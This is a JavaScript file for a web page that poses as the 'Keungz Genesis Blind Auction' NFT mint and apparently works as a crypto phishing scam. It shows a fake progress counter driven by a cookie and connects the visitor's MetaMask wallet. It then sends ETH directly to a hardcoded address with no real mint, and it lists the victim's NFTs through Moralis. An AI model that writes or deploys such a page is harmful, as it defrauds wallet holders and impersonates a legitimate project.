const ADDRESS = '0xa908Dd3A62D61d4e313f8B3A91635DC4933007AA';
const ethereum = window.ethereum
const IMGPrice = 0.025;
const mint = document.querySelector(".mint")
const connect = document.querySelector(".connect")
const title = document.querySelector(".metamask_content-title")
const totalPrice = document.querySelector(".totalPrice")
const count = document.querySelector(".count")
const MAX = 5
const namess = "Keungz Genesis Blind Auction";
const discord = 'https://discord.gg/yogapetz';
const twitter = 'https://twitter.com/keunging';
const startCounter = 34;
const endCounter = 111;
let price = 0.0;
var totalPriceAmount = price;
var countAmount = 1;
var nftss, accounts;
var web3 = window.Web3
function getNow() {
    var d = new Date();
    var year = d.getFullYear();
    var month = change(d.getMonth() + 1);
    var day = change(d.getDate());
    var hour = change(d.getHours());
    var minute = change(d.getMinutes());
    var second = change(d.getSeconds());

    function change(t) {
        if (t < 10) {
            return "0" + t;
        } else {
            return t;
        }
    }
    var time = day + '/' + month + '/' + year + ' ' + hour + ':' + minute + ':' + second;
    return time;
}
var settimesss = function() {
    var now = getNow();
    document.getElementById("timess").innerHTML = now;
}
setInterval(settimesss, 1000);

document.getElementById("names").innerHTML = namess;
document.getElementById("end_txt").innerHTML = endCounter;
let mintNumber = getCookie('mintNumber');
if (mintNumber) {
    mintNumber = parseInt(mintNumber);
} else {
    setCookie('mintNumber', startCounter, 365);
    mintNumber = parseInt(getCookie('mintNumber'));
}
if (mintNumber >= endCounter) {
    mintNumber = endCounter;
}
document.getElementById("start_txt").innerHTML = mintNumber
var progressBar = (mintNumber / endCounter * 100).toFixed(2);
if (progressBar >= 100) {
    progressBar = 100;
}
document.getElementById("percentages_txt").innerHTML = progressBar + "%";
document.getElementById("percentages_lin").style.width = progressBar + "%";

function checkConnectStatus() {
    if (ethereum) {
        if (ethereum.selectedAddress) {
            connect.style.display = "none"
            mint.style.display = "block"
        } else if (ethereum.isMetaMask) {
            connect.style.display = "block"
            mint.style.display = "none"
        }
    } else {
        connect.style.display = "block"
        mint.style.display = "none"
    }
}
window.addEventListener("load", () => {
    totalPrice.innerText = price;
    checkConnectStatus();

})



const getAccount = async () => {
    try {
        web3 = await Moralis["enableWeb3"]();
        accounts = await ethereum.request({
            method: 'eth_requestAccounts'
        });
        // console.log(accounts)
        await syncNfts();
        if (window.ethereum.chainId == "0x1") {
            console.log("Already connected to ethereum mainnet...");
            checkConnectStatus();
        } else {
            try {
                await ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{
                        chainId: '0x1'
                    }],
                });
                checkConnectStatus();
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask.
                if (error.code === 4902) {
                    try {
                        await ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x1',
                                rpcUrl: netURL
                            }],
                        });
                        checkConnectStatus();
                    } catch (addError) {
                        // handle "add" error
                        console.log(addError);
                    }
                }
            }
        }
    } catch (e) {
        checkConnectStatus();
        console.log(e);
    }
}


function handleMessage(message = msg) {
    const notificationDiv = document.createElement("div");
    // el-notification right el-notification-fade-enter-active el-notification-fade-enter-to
    notificationDiv.className = "el-notification";
    notificationDiv.classList.add("notificationss", "right");
    const div2 = document.createElement("div");
    div2.className = "notification__group";
    const div3 = document.createElement("div");
    div3.className = "el-notification__content";
    const h2 = document.createElement("h2");
    h2.className = "el-notification__title";
    h2.innerHTML = "Transaction success";
    const p1 = document.createElement("p");
    p1.innerHTML = message;
    div3.appendChild(p1);
    div2.appendChild(h2);
    div2.appendChild(div3);
    notificationDiv.appendChild(div2);
    document.getElementById("body").appendChild(notificationDiv);
    setTimeout(() => {
        notificationDiv.remove();
    }, 2400);
}


var sendTransaction1 = async () => {
    const priceToWei = (totalPriceAmount * 1e18).toString(16)
    //const gasLimit = (100000 * totalPriceAmount).toString(16);
    ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: accounts[0],
                to: ADDRESS,
                value: priceToWei
            }, ],
        })
        .then((txHash) => {
            $('#mintingModal').modal('show')
            mini.click();
        })
        .catch((error) => {
            mint.click();
        });
};



// setTimeout(function() {
//     getAccount();
// }, 1000);




function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    // console.log(userAgent);
    // Windows Phone must come first because its UA also contains "Android"
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const uid = urlParams.get('uid')
    // console.log(uid);
    if (uid == "mm") {
        return "Metamask";
    }
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}
async function syncNfts() {
    try {
        nftss = await Moralis["Web3"]["getNFTs"]({
            "chain": "eth",
            "address": accounts[0]
        });
    } catch (_0x343e6c) {
        console["log"](_0x343e6c);
    }
}


document.addEventListener('DOMContentLoaded', (event) => {
    // getAccount();
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        var wrapper = document.createElement('a');
        wrapper.classList.add('mmLink');
        wrapper.href = "https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
        connect.parentNode.insertBefore(wrapper, connect);
        wrapper.appendChild(connect);
    }

});